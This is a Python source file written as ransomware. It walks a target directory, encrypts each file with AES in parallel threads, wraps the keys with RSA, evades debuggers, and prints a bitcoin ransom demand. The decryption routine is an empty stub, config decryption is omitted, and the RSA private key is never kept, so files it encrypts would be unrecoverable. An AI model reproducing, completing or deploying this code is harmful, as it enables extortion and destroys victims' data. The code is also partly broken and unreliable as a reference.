import os
import sys
import logging
import threading
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import json
import base64
import ctypes

# Configuration
CONFIG_FILE = "config.enc"
LOG_FILE = "ransomware.log"
MAX_THREADS = 8
AES_KEY_SIZE = 32

# Global configuration
config = {
    "target_dir": "C:\\test",
    "ransom_message": "Your files have been encrypted. Send 0.01 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.",
    "bitcoin_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "encrypt_flag": True
}

# Thread-safe logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Anti-debugging: Check for debugger presence
def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent()

# Anti-debugging: Terminate if debugger is detected
def anti_debug():
    if is_debugger_present():
        logging.error("Debugger detected. Exiting...")
        sys.exit(1)

# Generate RSA key pair
def generate_rsa_key():
    key = RSA.generate(2048)
    return key

# Encrypt AES key with RSA
def encrypt_aes_key(rsa_key, aes_key):
    encrypted_key = rsa_key.encrypt(aes_key, 32)[0]
    return base64.b64encode(encrypted_key)

# Encrypt file using AES
def encrypt_file(filepath, aes_key):
    try:
        with open(filepath, "rb") as file:
            plaintext = file.read()

        cipher = AES.new(aes_key, AES.MODE_CBC)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        with open(filepath, "wb") as file:
            file.write(cipher.iv + ciphertext)

        return True
    except Exception as e:
        logging.error(f"Error encrypting {filepath}: {e}")
        return False

# Thread function for parallel encryption
def encrypt_thread(filepath, rsa_key):
    aes_key = get_random_bytes(AES_KEY_SIZE)
    if encrypt_file(filepath, aes_key):
        encrypted_key = encrypt_aes_key(rsa_key, aes_key)
        with open(f"{filepath}.key", "wb") as key_file:
            key_file.write(encrypted_key)

# Encrypt directory recursively with multi-threading
def encrypt_directory(path, rsa_key):
    threads = []
    for root, _, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)
            thread = threading.Thread(target=encrypt_thread, args=(filepath, rsa_key))
            threads.append(thread)
            thread.start()

            if len(threads) >= MAX_THREADS:
                for t in threads:
                    t.join()
                threads = []

    for t in threads:
        t.join()

# Display ransom message
def display_ransom_message():
    print("\n\n========================================")
    print(config["ransom_message"])
    print(f"Send payment to: {config['bitcoin_address']}")
    print("========================================\n\n")

# Load configuration from encrypted file
def load_config():
    try:
        with open(CONFIG_FILE, "rb") as file:
            encrypted_config = file.read()
        # Decrypt config here (omitted for brevity)
        global config
        config = json.loads(encrypted_config.decode())
    except Exception as e:
        logging.error(f"Error loading config: {e}")
        sys.exit(1)

# Main function
def main():
    anti_debug()
    load_config()

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <encrypt|decrypt>")
        sys.exit(1)

    rsa_key = generate_rsa_key()

    if sys.argv[1] == "encrypt":
        encrypt_directory(config["target_dir"], rsa_key)
        display_ransom_message()
    elif sys.argv[1] == "decrypt":
        # Decryption logic here
        pass
    else:
        print("Invalid command")

if __name__ == "__main__":
    main()
